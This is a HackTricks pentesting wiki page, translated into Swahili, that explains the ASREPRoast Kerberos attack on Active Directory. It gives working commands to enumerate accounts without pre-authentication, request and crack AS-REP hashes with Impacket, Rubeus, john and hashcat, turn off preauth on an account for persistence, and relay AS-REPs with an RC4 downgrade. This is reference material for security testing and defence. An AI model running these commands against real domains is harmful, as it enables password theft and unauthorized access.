# ASREPRoast

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Jiunge na [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server ili kuwasiliana na wadukuzi wenye uzoefu na wawindaji wa zawadi za mdudu!

**Machapisho Kuhusu Kudukua**\
Shiriki na maudhui yanayochimba kwenye msisimko na changamoto za kudukua

**Taarifa za Kudukua Halisi**\
Kaa sawa na ulimwengu wa kudukua wenye kasi kupitia taarifa za wakati halisi na ufahamu

**Matangazo ya Karibuni**\
Baki mwelekezi na zawadi mpya za mdudu zinazoanzishwa na sasisho muhimu za jukwaa

**Jiunge nasi kwenye** [**Discord**](https://discord.com/invite/N3FrSbmwdy) na anza kushirikiana na wadukuzi bora leo!

## ASREPRoast

ASREPRoast ni shambulio la usalama linalotumia watumiaji ambao hawana **sifa inayohitajika ya kabla ya uthibitishaji wa Kerberos**. Kimsingi, udhaifu huu huruhusu wadukuzi kuomba uthibitisho kwa mtumiaji kutoka kwa Msimamizi wa Kikoa (DC) bila kuhitaji nywila ya mtumiaji. DC kisha hujibu kwa ujumbe uliofichwa kwa ufunguo uliochotwa kutoka kwa nywila ya mtumiaji, ambao wadukuzi wanaweza kujaribu kuvunja nje ya mtandao ili kugundua nywila ya mtumiaji.

Mahitaji muhimu kwa shambulio hili ni:

* **Ukosefu wa kabla ya uthibitishaji wa Kerberos**: Watumiaji walengwa lazima wasiwe na kipengele hiki cha usalama kimezimwa.
* **Unganisho na Msimamizi wa Kikoa (DC)**: Wadukuzi wanahitaji ufikiaji wa DC kutuma maombi na kupokea ujumbe uliofichwa.
* **Akaunti ya kikoa inayoweza**: Kuwa na akaunti ya kikoa inaruhusu wadukuzi kutambua watumiaji walio hatarini kwa ufanisi zaidi kupitia mizizi ya LDAP. Bila akaunti kama hiyo, wadukuzi lazima wapate majina ya mtumiaji kwa kubahatisha.

#### Kuhesabu watumiaji walio hatarini (inahitaji sifa za kikoa)
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
{% endcode %}

{% code title="Kutumia Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Omba ujumbe wa AS_REP

{% code title="Kutumia Linux" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% endcode %}

{% code title="Kutumia Windows" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
Kuchemsha AS-REP na Rubeus kutazalisha 4768 na aina ya kuchapisha ya 0x17 na aina ya awali ya 0.
{% endhint %}

### Kuvunja
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Uthabiti

Lazima **preauth** isihitajike kwa mtumiaji ambapo una ruhusa za **GenericAll** (au ruhusa za kuandika mali):
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% endcode %}

{% code title="Kutumia Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
## ASREProast bila sifa za kujiandikisha

Mshambuliaji anaweza kutumia nafasi ya mtu katikati kuteka pakiti za AS-REP wanapopita kwenye mtandao bila kutegemea kufungwa kwa uthibitishaji wa mapema wa Kerberos. Kwa hivyo, inafanya kazi kwa watumiaji wote kwenye VLAN. [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) inaruhusu kutenda hivyo. Zaidi ya hayo, zana hiyo inalazimisha vituo vya kazi vya wateja kutumia RC4 kwa kubadilisha mazungumzo ya Kerberos.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Marejeo

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

***

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Jiunge na [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server ili kuzungumza na wakorofi wenye uzoefu na wawindaji wa tuzo za mdudu!

**Machapisho ya Udukuzi**\
Shiriki na maudhui yanayochimba kina kuhusu msisimko na changamoto za udukuzi

**Taarifa za Udukuzi za Wakati Halisi**\
Kaa up-to-date na ulimwengu wa udukuzi wenye kasi kupitia taarifa za habari za wakati halisi

**Matangazo Mapya**\
Baki mwelekezwa na tuzo za mdudu zinazoanzishwa na sasisho muhimu za jukwaa

**Jiunge nasi kwenye** [**Discord**](https://discord.com/invite/N3FrSbmwdy) na anza kushirikiana na wakorofi bora leo!

<details>

<summary><strong>Jifunze udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
